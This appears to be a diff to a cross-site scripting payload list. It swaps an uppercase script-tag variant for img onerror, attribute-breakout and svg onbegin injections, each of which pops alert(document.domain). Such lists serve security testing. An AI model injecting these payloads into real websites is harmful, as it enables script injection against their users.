@@ -1,2 +1,4 @@
 <script>alert(document.domain);</script>
-<SCRIPT>alert(document.domain);</SCRIPT>
+<img src=x onerror=alert(document.domain)>
+"><img src=x onerror=alert(document.domain)>
+<svg><animatetransform onbegin=alert(document.domain)>
